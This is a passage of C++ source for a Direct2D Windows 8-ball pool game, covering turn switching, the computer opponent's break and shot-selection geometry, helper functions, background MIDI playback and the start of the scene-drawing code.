        PlayerInfo& opponent = (currentPlayer == 1) ? player2Info : player1Info;
        bool      onEightRoll = IsPlayerOnEightBall(currentPlayer);
        int       calledPocket = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        int       actualPocket = -1;
        Ball* bEight = GetBallById(8);

        // locate which hole the 8-ball went into
        if (bEight) {
            for (int i = 0; i < 6; ++i) {
                if (GetDistanceSq(bEight->x, bEight->y,
                    pocketPositions[i].x, pocketPositions[i].y)
                    < POCKET_RADIUS * POCKET_RADIUS * 1.5f) {
                    actualPocket = i; break;
                }
            }
        }

        // 1) On break / pre-assignment: re-spot & continue
        if (player1Info.assignedType == BallType::NONE) {
            if (bEight) {
                bEight->isPocketed = false;
                bEight->x = RACK_POS_X; bEight->y = RACK_POS_Y;
                bEight->vx = bEight->vy = 0;
            }
            if (cueBallPocketed) foulCommitted = true;
            return;
        }

        // 2) Loss if pocketed 8 early
        if (!onEightRoll) {
            gameOverMessage = opponent.name + L"" Wins! ("" + shooter.name + L"" pocketed 8-ball early)"";
        }
        // 3) Loss if scratched
        else if (cueBallPocketed) {
            gameOverMessage = opponent.name + L"" Wins! ("" + shooter.name + L"" scratched on 8-ball)"";
        }
        // 4) Loss if no pocket call
        else if (calledPocket < 0) {
            gameOverMessage = opponent.name + L"" Wins! ("" + shooter.name + L"" did not call a pocket)"";
        }
        // 5) Loss if in wrong pocket
        else if (actualPocket != calledPocket) {
            gameOverMessage = opponent.name + L"" Wins! ("" + shooter.name + L"" 8-ball in wrong pocket)"";
        }
        // 6) Otherwise, valid win
        else {
            gameOverMessage = shooter.name + L"" Wins!"";
        }

        currentGameState = GAME_OVER;
    } */


    // Switch the shooter, handle fouls and decide what state we go to next.
    // ────────────────────────────────────────────────────────────────
    //  SwitchTurns – final version (arrow–leak bug fixed)
    // ────────────────────────────────────────────────────────────────
    void SwitchTurns()
    {
        /* --------------------------------------------------------- */
        /* 1.  Hand the table over to the other player               */
        /* --------------------------------------------------------- */
        currentPlayer = (currentPlayer == 1) ? 2 : 1;

        /* --------------------------------------------------------- */
        /* 2.  Generic per–turn resets                               */
        /* --------------------------------------------------------- */
        isAiming = false;
        shotPower = 0.0f;
        currentlyHoveredPocket = -1;

        /* --------------------------------------------------------- */
        /* 3.  Wipe every previous pocket call                       */
        /*    (the new shooter will choose again if needed)          */
        /* --------------------------------------------------------- */
        calledPocketP1 = -1;
        calledPocketP2 = -1;
        pocketCallMessage.clear();

        /* --------------------------------------------------------- */
        /* 4.  Handle fouls — cue-ball in hand overrides everything  */
        /* --------------------------------------------------------- */
        if (foulCommitted)
        {
            if (currentPlayer == 1)            // human
            {
                currentGameState = BALL_IN_HAND_P1;
                aiTurnPending = false;
            }
            else                               // P2
            {
                currentGameState = BALL_IN_HAND_P2;
                aiTurnPending = isPlayer2AI;   // AI will place cue-ball
            }

            foulCommitted = false;
            return;                            // we're done for this frame
        }

        /* --------------------------------------------------------- */
        /* 5.  Normal flow                                           */
        /*    Will put us in  ∘ PLAYER?_TURN                         */
        /*                    ∘ CHOOSING_POCKET_P?                   */
        /*                    ∘ AI_THINKING  (for CPU)               */
        /* --------------------------------------------------------- */
        CheckAndTransitionToPocketChoice(currentPlayer);
    }


    void AIBreakShot() {
        Ball* cueBall = GetCueBall();
        if (!cueBall) return;

        // This function is called when it's AI's turn for the opening break and state is PRE_BREAK_PLACEMENT.
        // AI will place the cue ball and then plan the shot.
        if (isOpeningBreakShot && currentGameState == PRE_BREAK_PLACEMENT) {
            // Place cue ball in the kitchen randomly
            /*float kitchenMinX = TABLE_LEFT + BALL_RADIUS; // [cite: 1071, 1072, 1587]
            float kitchenMaxX = HEADSTRING_X - BALL_RADIUS; // [cite: 1072, 1078, 1588]
            float kitchenMinY = TABLE_TOP + BALL_RADIUS; // [cite: 1071, 1072, 1588]
            float kitchenMaxY = TABLE_BOTTOM - BALL_RADIUS; // [cite: 1072, 1073, 1589]*/

            // --- AI Places Cue Ball for Break ---
    // Decide if placing center or side. For simplicity, let's try placing slightly off-center
    // towards one side for a more angled break, or center for direct apex hit.
    // A common strategy is to hit the second ball of the rack.

            float placementY = RACK_POS_Y; // Align vertically with the rack center
            float placementX;

            // Randomly choose a side or center-ish placement for variation.
            int placementChoice = rand() % 3; // 0: Left-ish, 1: Center-ish, 2: Right-ish in kitchen

            if (placementChoice == 0) { // Left-ish
                placementX = HEADSTRING_X - (TABLE_WIDTH * 0.05f) - (BALL_RADIUS * (1 + (rand() % 3))); // Place slightly to the left within kitchen
            }
            else if (placementChoice == 2) { // Right-ish
                placementX = HEADSTRING_X - (TABLE_WIDTH * 0.05f) + (BALL_RADIUS * (1 + (rand() % 3))); // Place slightly to the right within kitchen
            }
            else { // Center-ish
                placementX = TABLE_LEFT + (HEADSTRING_X - TABLE_LEFT) * 0.5f; // Roughly center of kitchen
            }
            placementX = std::max(TABLE_LEFT + BALL_RADIUS + 1.0f, std::min(placementX, HEADSTRING_X - BALL_RADIUS - 1.0f)); // Clamp within kitchen X

            bool validPos = false;
            int attempts = 0;
            while (!validPos && attempts < 100) {
                /*cueBall->x = kitchenMinX + static_cast<float>(rand()) / (static_cast<float>(RAND_MAX) / (kitchenMaxX - kitchenMinX)); // [cite: 1589]
                cueBall->y = kitchenMinY + static_cast<float>(rand()) / (static_cast<float>(RAND_MAX) / (kitchenMaxY - kitchenMinY)); // [cite: 1590]
                if (IsValidCueBallPosition(cueBall->x, cueBall->y, true)) { // [cite: 1591]
                    validPos = true; // [cite: 1591]*/
                    // Try the chosen X, but vary Y slightly to find a clear spot
                cueBall->x = placementX;
                cueBall->y = placementY + (static_cast<float>(rand() % 100 - 50) / 100.0f) * BALL_RADIUS * 2.0f; // Vary Y a bit
                cueBall->y = std::max(TABLE_TOP + BALL_RADIUS + 1.0f, std::min(cueBall->y, TABLE_BOTTOM - BALL_RADIUS - 1.0f)); // Clamp Y

                if (IsValidCueBallPosition(cueBall->x, cueBall->y, true /* behind headstring */)) {
                    validPos = true;
                }
                attempts++; // [cite: 1592]
            }
            if (!validPos) {
                // Fallback position
                /*cueBall->x = TABLE_LEFT + (HEADSTRING_X - TABLE_LEFT) * 0.5f; // [cite: 1071, 1078, 1593]
                cueBall->y = (TABLE_TOP + TABLE_BOTTOM) * 0.5f; // [cite: 1071, 1073, 1594]
                if (!IsValidCueBallPosition(cueBall->x, cueBall->y, true)) { // [cite: 1594]
                    cueBall->x = HEADSTRING_X - BALL_RADIUS * 2; // [cite: 1072, 1078, 1594]
                    cueBall->y = RACK_POS_Y; // [cite: 1080, 1595]
                }
            }
            cueBall->vx = 0; // [cite: 1595]
            cueBall->vy = 0; // [cite: 1596]

            // Plan a break shot: aim at the center of the rack (apex ball)
            float targetX = RACK_POS_X; // [cite: 1079] Aim for the apex ball X-coordinate
            float targetY = RACK_POS_Y; // [cite: 1080] Aim for the apex ball Y-coordinate

            float dx = targetX - cueBall->x; // [cite: 1599]
            float dy = targetY - cueBall->y; // [cite: 1600]
            float shotAngle = atan2f(dy, dx); // [cite: 1600]
            float shotPowerValue = MAX_SHOT_POWER; // [cite: 1076, 1600] Use MAX_SHOT_POWER*/

                cueBall->x = TABLE_LEFT + (HEADSTRING_X - TABLE_LEFT) * 0.75f; // A default safe spot in kitchen
                cueBall->y = RACK_POS_Y;
            }
            cueBall->vx = 0; cueBall->vy = 0;

            // --- AI Plans the Break Shot ---
            float targetX, targetY;
            // If cue ball is near center of kitchen width, aim for apex.
            // Otherwise, aim for the second ball on the side the cue ball is on (for a cut break).
            float kitchenCenterRegion = (HEADSTRING_X - TABLE_LEFT) * 0.3f; // Define a ""center"" region
            if (std::abs(cueBall->x - (TABLE_LEFT + (HEADSTRING_X - TABLE_LEFT) / 2.0f)) < kitchenCenterRegion / 2.0f) {
                // Center-ish placement: Aim for the apex ball (ball ID 1 or first ball in rack)
                targetX = RACK_POS_X; // Apex ball X
                targetY = RACK_POS_Y; // Apex ball Y
            }
            else {
                // Side placement: Aim to hit the ""second"" ball of the rack for a wider spread.
                // This is a simplification. A more robust way is to find the actual second ball.
                // For now, aim slightly off the apex towards the side the cue ball is on.
                targetX = RACK_POS_X + BALL_RADIUS * 2.0f * 0.866f; // X of the second row of balls
                targetY = RACK_POS_Y + ((cueBall->y > RACK_POS_Y) ? -BALL_RADIUS : BALL_RADIUS); // Aim at the upper or lower of the two second-row balls
            }

            float dx = targetX - cueBall->x;
            float dy = targetY - cueBall->y;
            float shotAngle = atan2f(dy, dx);
            float shotPowerValue = MAX_SHOT_POWER * (0.9f + (rand() % 11) / 100.0f); // Slightly vary max power

            // Store planned shot details for the AI
            /*aiPlannedShotDetails.angle = shotAngle; // [cite: 1102, 1601]
            aiPlannedShotDetails.power = shotPowerValue; // [cite: 1102, 1601]
            aiPlannedShotDetails.spinX = 0.0f; // [cite: 1102, 1601] No spin for a standard power break
            aiPlannedShotDetails.spinY = 0.0f; // [cite: 1103, 1602]
            aiPlannedShotDetails.isValid = true; // [cite: 1103, 1602]*/

            aiPlannedShotDetails.angle = shotAngle;
            aiPlannedShotDetails.power = shotPowerValue;
            aiPlannedShotDetails.spinX = 0.0f; // No spin for break usually
            aiPlannedShotDetails.spinY = 0.0f;
            aiPlannedShotDetails.isValid = true;

            // Update global cue parameters for immediate visual feedback if DrawAimingAids uses them
            /*::cueAngle = aiPlannedShotDetails.angle;      // [cite: 1109, 1603] Update global cueAngle
            ::shotPower = aiPlannedShotDetails.power;     // [cite: 1109, 1604] Update global shotPower
            ::cueSpinX = aiPlannedShotDetails.spinX;    // [cite: 1109]
            ::cueSpinY = aiPlannedShotDetails.spinY;    // [cite: 1110]*/

            ::cueAngle = aiPlannedShotDetails.angle;
            ::shotPower = aiPlannedShotDetails.power;
            ::cueSpinX = aiPlannedShotDetails.spinX;
            ::cueSpinY = aiPlannedShotDetails.spinY;

            // Set up for AI display via GameUpdate
            /*aiIsDisplayingAim = true;                   // [cite: 1104] Enable AI aiming visualization
            aiAimDisplayFramesLeft = AI_AIM_DISPLAY_DURATION_FRAMES; // [cite: 1105] Set duration for display

            currentGameState = AI_THINKING; // [cite: 1081] Transition to AI_THINKING state.
                                            // GameUpdate will handle the aiAimDisplayFramesLeft countdown
                                            // and then execute the shot using aiPlannedShotDetails.
                                            // isOpeningBreakShot will be set to false within ApplyShot.

            // No immediate ApplyShot or sound here; GameUpdate's AI execution logic will handle it.*/

            aiIsDisplayingAim = true;
            aiAimDisplayFramesLeft = AI_AIM_DISPLAY_DURATION_FRAMES;
            currentGameState = AI_THINKING; // State changes to AI_THINKING, GameUpdate will handle shot execution after display
            aiTurnPending = false;

            return; // The break shot is now planned and will be executed by GameUpdate
        }

        // 2. If not in PRE_BREAK_PLACEMENT (e.g., if this function were called at other times,
        //    though current game logic only calls it for PRE_BREAK_PLACEMENT)
        //    This part can be extended if AIBreakShot needs to handle other scenarios.
        //    For now, the primary logic is above.
    }

    // --- Helper Functions ---

    Ball* GetBallById(int id) {
        for (size_t i = 0; i < balls.size(); ++i) {
            if (balls[i].id == id) {
                return &balls[i];
            }
        }
        return nullptr;
    }

    Ball* GetCueBall() {
        return GetBallById(0);
    }

    float GetDistance(float x1, float y1, float x2, float y2) {
        return sqrtf(GetDistanceSq(x1, y1, x2, y2));
    }

    float GetDistanceSq(float x1, float y1, float x2, float y2) {
        float dx = x2 - x1;
        float dy = y2 - y1;
        return dx * dx + dy * dy;
    }

    bool IsValidCueBallPosition(float x, float y, bool checkHeadstring) {
        // Basic bounds check (inside cushions)
        float left = TABLE_LEFT + CUSHION_THICKNESS + BALL_RADIUS;
        float right = TABLE_RIGHT - CUSHION_THICKNESS - BALL_RADIUS;
        float top = TABLE_TOP + CUSHION_THICKNESS + BALL_RADIUS;
        float bottom = TABLE_BOTTOM - CUSHION_THICKNESS - BALL_RADIUS;

        if (x < left || x > right || y < top || y > bottom) {
            return false;
        }

        // Check headstring restriction if needed
        if (checkHeadstring && x >= HEADSTRING_X) {
            return false;
        }

        // Check overlap with other balls
        for (size_t i = 0; i < balls.size(); ++i) {
            if (balls[i].id != 0 && !balls[i].isPocketed) { // Don't check against itself or pocketed balls
                if (GetDistanceSq(x, y, balls[i].x, balls[i].y) < (BALL_RADIUS * 2.0f) * (BALL_RADIUS * 2.0f)) {
                    return false; // Overlapping another ball
                }
            }
        }

        return true;
    }

    // --- NEW HELPER FUNCTION IMPLEMENTATIONS ---

    // Checks if a player has pocketed all their balls and is now on the 8-ball.
    bool IsPlayerOnEightBall(int player) {
        PlayerInfo& playerInfo = (player == 1) ? player1Info : player2Info;
        if (playerInfo.assignedType != BallType::NONE && playerInfo.assignedType != BallType::EIGHT_BALL && playerInfo.ballsPocketedCount >= 7) {
            Ball* eightBall = GetBallById(8);
            return (eightBall && !eightBall->isPocketed);
        }
        return false;
    }

    void CheckAndTransitionToPocketChoice(int playerID) {
        bool needsToCall = IsPlayerOnEightBall(playerID);

        if (needsToCall) {
            if (playerID == 1) { // Human Player 1
                currentGameState = CHOOSING_POCKET_P1;
                pocketCallMessage = player1Info.name + L"": Choose a pocket for the 8-Ball..."";
                if (calledPocketP1 == -1) calledPocketP1 = 2; // Default to bottom-right
            }
            else { // Player 2
                if (isPlayer2AI) {
                    // FOOLPROOF FIX: AI doesn't choose here. It transitions to a thinking state.
                    // AIMakeDecision will handle the choice and the pocket call.
                    currentGameState = AI_THINKING;
                    aiTurnPending = true; // Signal the main loop to run AIMakeDecision
                }
                else { // Human Player 2
                    currentGameState = CHOOSING_POCKET_P2;
                    pocketCallMessage = player2Info.name + L"": Choose a pocket for the 8-Ball..."";
                    if (calledPocketP2 == -1) calledPocketP2 = 2; // Default to bottom-right
                }
            }
        }
        else {
            // Player does not need to call a pocket, proceed to normal turn.
            pocketCallMessage = L"""";
            currentGameState = (playerID == 1) ? PLAYER1_TURN : PLAYER2_TURN;
            if (playerID == 2 && isPlayer2AI) {
                aiTurnPending = true;
            }
        }
    }


    template <typename T>
    void SafeRelease(T** ppT) {
        if (*ppT) {
            (*ppT)->Release();
            *ppT = nullptr;
        }
    }

    // --- CPU Ball?in?Hand Placement --------------------------------
    // Moves the cue ball to a legal ""ball in hand"" position for the AI.
    void AIPlaceCueBall() {
        Ball* cue = GetCueBall();
        if (!cue) return;

        // Simple strategy: place back behind the headstring at the standard break spot
        cue->x = TABLE_LEFT + TABLE_WIDTH * 0.15f;
        cue->y = RACK_POS_Y;
        cue->vx = cue->vy = 0.0f;
    }

    // --- Helper Function for Line Segment Intersection ---
    // Finds intersection point of line segment P1->P2 and line segment P3->P4
    // Returns true if they intersect, false otherwise. Stores intersection point in 'intersection'.
    bool LineSegmentIntersection(D2D1_POINT_2F p1, D2D1_POINT_2F p2, D2D1_POINT_2F p3, D2D1_POINT_2F p4, D2D1_POINT_2F& intersection)
    {
        float denominator = (p4.y - p3.y) * (p2.x - p1.x) - (p4.x - p3.x) * (p2.y - p1.y);

        // Check if lines are parallel or collinear
        if (fabs(denominator) < 1e-6) {
            return false;
        }

        float ua = ((p4.x - p3.x) * (p1.y - p3.y) - (p4.y - p3.y) * (p1.x - p3.x)) / denominator;
        float ub = ((p2.x - p1.x) * (p1.y - p3.y) - (p2.y - p1.y) * (p1.x - p3.x)) / denominator;

        // Check if intersection point lies on both segments
        if (ua >= 0.0f && ua <= 1.0f && ub >= 0.0f && ub <= 1.0f) {
            intersection.x = p1.x + ua * (p2.x - p1.x);
            intersection.y = p1.y + ua * (p2.y - p1.y);
            return true;
        }

        return false;
    }

    // --- INSERT NEW HELPER FUNCTION HERE ---
    // Calculates the squared distance from point P to the line segment AB.
    float PointToLineSegmentDistanceSq(D2D1_POINT_2F p, D2D1_POINT_2F a, D2D1_POINT_2F b) {
        float l2 = GetDistanceSq(a.x, a.y, b.x, b.y);
        if (l2 == 0.0f) return GetDistanceSq(p.x, p.y, a.x, a.y); // Segment is a point
        // Consider P projecting onto the line AB infinite line
        // t = [(P-A) . (B-A)] / |B-A|^2
        float t = ((p.x - a.x) * (b.x - a.x) + (p.y - a.y) * (b.y - a.y)) / l2;
        t = std::max(0.0f, std::min(1.0f, t)); // Clamp t to the segment [0, 1]
        // Projection falls on the segment
        D2D1_POINT_2F projection = D2D1::Point2F(a.x + t * (b.x - a.x), a.y + t * (b.y - a.y));
        return GetDistanceSq(p.x, p.y, projection.x, projection.y);
    }
    // --- End New Helper ---

    // --- NEW AI Implementation Functions ---

    void AIMakeDecision() {
        // Start with a clean slate for the AI's plan.
        aiPlannedShotDetails.isValid = false;
        Ball* cueBall = GetCueBall();
        if (!cueBall || !isPlayer2AI || currentPlayer != 2) return;

        // Ask the ""expert"" (AIFindBestShot) for the best possible shot.
        AIShotInfo bestShot = AIFindBestShot();

        if (bestShot.possible) {
            // A good shot was found.
            // If it's an 8-ball shot, ""call"" the pocket.
            if (bestShot.involves8Ball) {
                calledPocketP2 = bestShot.pocketIndex;
            }
            else {
                calledPocketP2 = -1; // Ensure no pocket is called on a normal shot.
            }

            // Commit the details of the best shot to the AI's plan.
            aiPlannedShotDetails.angle = bestShot.angle;
            aiPlannedShotDetails.power = bestShot.power;
            aiPlannedShotDetails.spinX = bestShot.spinX;
            aiPlannedShotDetails.spinY = bestShot.spinY;
            aiPlannedShotDetails.isValid = true;

        }
        else {
            // No good offensive shot found, must play a safe defensive shot.
            // (This is a fallback and your current AIFindBestShot should prevent this)
            aiPlannedShotDetails.isValid = false;
        }

        // --- FOOLPROOF FIX: Trigger the Aim Display ---
        // If any valid plan was made, update the visuals and start the display pause.
        if (aiPlannedShotDetails.isValid) {

            // STEP 1: Copy the AI's plan into the global variables used for drawing.
            // This is the critical missing link.
            cueAngle = aiPlannedShotDetails.angle;
            shotPower = aiPlannedShotDetails.power;

            // STEP 2: Trigger the visual display pause.
            // These are the two lines you correctly identified.
            aiIsDisplayingAim = true;
            aiAimDisplayFramesLeft = AI_AIM_DISPLAY_DURATION_FRAMES;

        }
        else {
            // Absolute fallback: If no plan could be made, switch turns to prevent a freeze.
            SwitchTurns();
        }
    }


    AIShotInfo AIFindBestShot()
    {
        AIShotInfo best;                       // .possible == false
        Ball* cue = GetCueBall();
        if (!cue) return best;

        const bool on8 = IsPlayerOnEightBall(2);
        const BallType wantType = player2Info.assignedType;

        for (Ball& b : balls)
        {
            if (b.isPocketed || b.id == 0) continue;

            // decide if this ball is a legal/interesting target
            bool ok =
                on8 ? (b.id == 8) :
                ((wantType == BallType::NONE) || (b.type == wantType));

            if (!ok) continue;

            for (int p = 0; p < 6; ++p)
            {
                AIShotInfo cand = EvaluateShot(&b, p);
                if (cand.possible &&
                    (!best.possible || cand.score > best.score))
                    best = cand;
            }
        }

        // fall-back: tap cue ball forward (safety) if no potting line exists
        if (!best.possible && cue)
        {
            best.possible = true;
            best.angle = static_cast<float>(rand()) / RAND_MAX * 2.0f * PI;
            best.power = MAX_SHOT_POWER * 0.30f;
            best.spinX = best.spinY = 0.0f;
            best.targetBall = nullptr;
            best.score = -99999.0f;
            best.pocketIndex = -1;
        }
        return best;
    }


    // Evaluate a potential shot at a specific target ball towards a specific pocket
    AIShotInfo EvaluateShot(Ball* targetBall, int pocketIndex) {
        AIShotInfo shotInfo; // Defaults to not possible
        shotInfo.targetBall = targetBall;
        shotInfo.pocketIndex = pocketIndex;
        shotInfo.involves8Ball = (targetBall && targetBall->id == 8);

        Ball* cueBall = GetCueBall();
        if (!cueBall || !targetBall) return shotInfo;

        // 1. Calculate Ghost Ball position (where cue must hit target)
        shotInfo.ghostBallPos = CalculateGhostBallPos(targetBall, pocketIndex);

        // 2. Check Path: Cue Ball -> Ghost Ball Position
        if (!IsPathClear(D2D1::Point2F(cueBall->x, cueBall->y), shotInfo.ghostBallPos, cueBall->id, targetBall->id)) {
            return shotInfo; // Path blocked, shot is impossible.
        }

        // 3. Calculate Angle and Power
        float dx = shotInfo.ghostBallPos.x - cueBall->x;
        float dy = shotInfo.ghostBallPos.y - cueBall->y;
        shotInfo.angle = atan2f(dy, dx);

        float cueToGhostDist = GetDistance(cueBall->x, cueBall->y, shotInfo.ghostBallPos.x, shotInfo.ghostBallPos.y);
        float targetToPocketDist = GetDistance(targetBall->x, targetBall->y, pocketPositions[pocketIndex].x, pocketPositions[pocketIndex].y);
        shotInfo.power = CalculateShotPower(cueToGhostDist, targetToPocketDist);

        // 4. Score the shot (simple scoring: closer and straighter is better)
        shotInfo.score = 1000.0f - (cueToGhostDist + targetToPocketDist);

        // If we reached here, the shot is geometrically possible.
        shotInfo.possible = true;
        return shotInfo;
    }


    //  Estimate the power that will carry the cue-ball to the ghost position
    //  *and* push the object-ball the remaining distance to the pocket.
    //
    //  • cueToGhostDist    – pixels from cue to ghost-ball centre
    //  • targetToPocketDist– pixels from object-ball to chosen pocket
    //
    //  The function is fully deterministic (good for AI search) yet produces
    //  human-looking power levels.
    //
    float CalculateShotPower(float cueToGhostDist, float targetToPocketDist)
    {
        // Total distance the *energy* must cover (cue path + object-ball path)
        float totalDist = cueToGhostDist + targetToPocketDist;

        // Typical diagonal of the playable area (approx.) – used for scaling
        constexpr float TABLE_DIAG = 900.0f;

        // 1.  Convert distance to a 0-1 number (0: tap-in, 1: table length)
        float norm = std::clamp(totalDist / TABLE_DIAG, 0.0f, 1.0f);

        // 2.  Ease-in curve (smoothstep) for nicer progression
        norm = norm * norm * (3.0f - 2.0f * norm);

        // 3.  Blend between a gentle minimum and the absolute maximum
        const float MIN_POWER = MAX_SHOT_POWER * 0.18f;     // just enough to move
        float power = MIN_POWER + norm * (MAX_SHOT_POWER - MIN_POWER);

        // 4.  Safety clamp (also screens out degenerate calls)
        power = std::clamp(power, 0.15f, MAX_SHOT_POWER);

        return power;
    }

    // ------------------------------------------------------------------
    //  Return the ghost-ball centre needed for the target ball to roll
    //  straight into the chosen pocket.
    // ------------------------------------------------------------------
    D2D1_POINT_2F CalculateGhostBallPos(Ball* targetBall, int pocketIndex)
    {
        if (!targetBall) return D2D1::Point2F(0, 0);

        D2D1_POINT_2F P = pocketPositions[pocketIndex];

        float vx = P.x - targetBall->x;
        float vy = P.y - targetBall->y;
        float L = sqrtf(vx * vx + vy * vy);
        if (L < 1.0f) L = 1.0f;                // safety

        vx /= L;   vy /= L;

        return D2D1::Point2F(
            targetBall->x - vx * (BALL_RADIUS * 2.0f),
            targetBall->y - vy * (BALL_RADIUS * 2.0f));
    }

    // Calculate the position the cue ball needs to hit for the target ball to go towards the pocket
    // ────────────────────────────────────────────────────────────────
    //   2.  Shot evaluation & search
    // ────────────────────────────────────────────────────────────────

    //  Calculate ghost-ball position so that cue hits target towards pocket
    static inline D2D1_POINT_2F GhostPos(const Ball* tgt, int pocketIdx)
    {
        D2D1_POINT_2F P = pocketPositions[pocketIdx];
        float vx = P.x - tgt->x;
        float vy = P.y - tgt->y;
        float L = sqrtf(vx * vx + vy * vy);
        vx /= L;  vy /= L;
        return D2D1::Point2F(tgt->x - vx * (BALL_RADIUS * 2.0f),
            tgt->y - vy * (BALL_RADIUS * 2.0f));
    }

    //  Heuristic: shorter + straighter + proper group = higher score
    static inline float ScoreShot(float cue2Ghost,
        float tgt2Pocket,
        bool  correctGroup,
        bool  involves8)
    {
        float base = 2000.0f - (cue2Ghost + tgt2Pocket);   // prefer close shots
        if (!correctGroup)  base -= 400.0f;                  // penalty
        if (involves8)      base += 150.0f;                  // a bit more desirable
        return base;
    }

    // Checks if line segment is clear of obstructing balls
    // ────────────────────────────────────────────────────────────────
    //   1.  Low-level helpers – IsPathClear & FindFirstHitBall
    // ────────────────────────────────────────────────────────────────

    //  Test if the capsule [ start … end ] (radius = BALL_RADIUS)
    //  intersects any ball except the ids we want to ignore.
    bool IsPathClear(D2D1_POINT_2F start,
        D2D1_POINT_2F end,
        int ignoredBallId1,
        int ignoredBallId2)
    {
        float dx = end.x - start.x;
        float dy = end.y - start.y;
        float lenSq = dx * dx + dy * dy;
        if (lenSq < 1e-3f) return true;             // degenerate → treat as clear

        for (const Ball& b : balls)
        {
            if (b.isPocketed)      continue;
            if (b.id == ignoredBallId1 ||
                b.id == ignoredBallId2)             continue;

            // project ball centre onto the segment
            float t = ((b.x - start.x) * dx + (b.y - start.y) * dy) / lenSq;
            t = std::clamp(t, 0.0f, 1.0f);

            float cx = start.x + t * dx;
            float cy = start.y + t * dy;

            if (GetDistanceSq(b.x, b.y, cx, cy) < (BALL_RADIUS * BALL_RADIUS))
                return false;                       // blocked
        }
        return true;
    }

    //  Cast an (infinite) ray and return the first non-pocketed ball hit.
    //  `hitDistSq` is distance² from the start point to the collision point.
    Ball* FindFirstHitBall(D2D1_POINT_2F start,
        float        angle,
        float& hitDistSq)
    {
        Ball* hitBall = nullptr;
        float  bestSq = std::numeric_limits<float>::max();
        float  cosA = cosf(angle);
        float  sinA = sinf(angle);

        for (Ball& b : balls)
        {
            if (b.id == 0 || b.isPocketed) continue;         // ignore cue & sunk balls

            float relX = b.x - start.x;
            float relY = b.y - start.y;
            float proj = relX * cosA + relY * sinA;          // distance along the ray

            if (proj <= 0) continue;                         // behind cue

            // closest approach of the ray to the sphere centre
            float closestX = start.x + proj * cosA;
            float closestY = start.y + proj * sinA;
            float dSq = GetDistanceSq(b.x, b.y, closestX, closestY);

            if (dSq <= BALL_RADIUS * BALL_RADIUS)            // intersection
            {
                float back = sqrtf(BALL_RADIUS * BALL_RADIUS - dSq);
                float collDist = proj - back;                // front surface
                float collSq = collDist * collDist;
                if (collSq < bestSq)
                {
                    bestSq = collSq;
                    hitBall = &b;
                }
            }
        }
        hitDistSq = bestSq;
        return hitBall;
    }

    // Basic check for reasonable AI aim angles (optional)
    bool IsValidAIAimAngle(float angle) {
        // Placeholder - could check for NaN or infinity if calculations go wrong
        return isfinite(angle);
    }

    //midi func = start
    void PlayMidiInBackground(HWND hwnd, const TCHAR* midiPath) {
        while (isMusicPlaying) {
            MCI_OPEN_PARMS mciOpen = { 0 };
            mciOpen.lpstrDeviceType = TEXT(""sequencer"");
            mciOpen.lpstrElementName = midiPath;

            if (mciSendCommand(0, MCI_OPEN, MCI_OPEN_TYPE | MCI_OPEN_ELEMENT, (DWORD_PTR)&mciOpen) == 0) {
                midiDeviceID = mciOpen.wDeviceID;

                MCI_PLAY_PARMS mciPlay = { 0 };
                mciSendCommand(midiDeviceID, MCI_PLAY, 0, (DWORD_PTR)&mciPlay);

                // Wait for playback to complete
                MCI_STATUS_PARMS mciStatus = { 0 };
                mciStatus.dwItem = MCI_STATUS_MODE;

                do {
                    mciSendCommand(midiDeviceID, MCI_STATUS, MCI_STATUS_ITEM, (DWORD_PTR)&mciStatus);
                    Sleep(100); // adjust as needed
                } while (mciStatus.dwReturn == MCI_MODE_PLAY && isMusicPlaying);

                mciSendCommand(midiDeviceID, MCI_CLOSE, 0, NULL);
                midiDeviceID = 0;
            }
        }
    }

    void StartMidi(HWND hwnd, const TCHAR* midiPath) {
        if (isMusicPlaying) {
            StopMidi();
        }
        isMusicPlaying = true;
        musicThread = std::thread(PlayMidiInBackground, hwnd, midiPath);
    }

    void StopMidi() {
        if (isMusicPlaying) {
            isMusicPlaying = false;
            if (musicThread.joinable()) musicThread.join();
            if (midiDeviceID != 0) {
                mciSendCommand(midiDeviceID, MCI_CLOSE, 0, NULL);
                midiDeviceID = 0;
            }
        }
    }

    /*void PlayGameMusic(HWND hwnd) {
        // Stop any existing playback
        if (isMusicPlaying) {
            isMusicPlaying = false;
            if (musicThread.joinable()) {
                musicThread.join();
            }
            if (midiDeviceID != 0) {
                mciSendCommand(midiDeviceID, MCI_CLOSE, 0, NULL);
                midiDeviceID = 0;
            }
        }

        // Get the path of the executable
        TCHAR exePath[MAX_PATH];
        GetModuleFileName(NULL, exePath, MAX_PATH);

        // Extract the directory path
        TCHAR* lastBackslash = _tcsrchr(exePath, '\\');
        if (lastBackslash != NULL) {
            *(lastBackslash + 1) = '\0';
        }

        // Construct the full path to the MIDI file
        static TCHAR midiPath[MAX_PATH];
        _tcscpy_s(midiPath, MAX_PATH, exePath);
        _tcscat_s(midiPath, MAX_PATH, TEXT(""BSQ.MID""));

        // Start the background playback
        isMusicPlaying = true;
        musicThread = std::thread(PlayMidiInBackground, hwnd, midiPath);
    }*/
    //midi func = end

    // --- Drawing Functions ---

    void OnPaint() {
        HRESULT hr = CreateDeviceResources(); // Ensure resources are valid

        if (SUCCEEDED(hr)) {
            pRenderTarget->BeginDraw();
            DrawScene(pRenderTarget); // Pass render target
            hr = pRenderTarget->EndDraw();

            if (hr == D2DERR_RECREATE_TARGET) {
                DiscardDeviceResources();
                // Optionally request another paint message: InvalidateRect(hwndMain, NULL, FALSE);
                // But the timer loop will trigger redraw anyway.
            }
        }
        // If CreateDeviceResources failed, EndDraw might not be called.
        // Consider handling this more robustly if needed.
    }

    void DrawScene(ID2D1RenderTarget* pRT) {
        if (!pRT) return;

        //pRT->Clear(D2D1::ColorF(D2D1::ColorF::LightGray)); // Background color
        // Set background color to #ffffcd (RGB: 255, 255, 205)
        pRT->Clear(D2D1::ColorF(0.3686f, 0.5333f, 0.3882f)); // Clear with light yellow background NEWCOLOR 1.0f, 1.0f, 0.803f => (0.3686f, 0.5333f, 0.3882f)
        //pRT->Clear(D2D1::ColorF(1.0f, 1.0f, 0.803f)); // Clear with light yellow background NEWCOLOR 1.0f, 1.0f, 0.803f => (0.3686f, 0.5333f, 0.3882f)

        DrawTable(pRT, pFactory);
        DrawPocketSelectionIndicator(pRT); // Draw arrow over selected/called pocket
        DrawBalls(pRT);
        DrawAimingAids(pRT); // Includes cue stick if aiming
        DrawUI(pRT);
        DrawPowerMeter(pRT);
        DrawSpinIndicator(pRT);
        DrawPocketedBallsIndicator(pRT);
        DrawBallInHandIndicator(pRT); // Draw cue ball ghost if placing

         // Draw Game Over Message
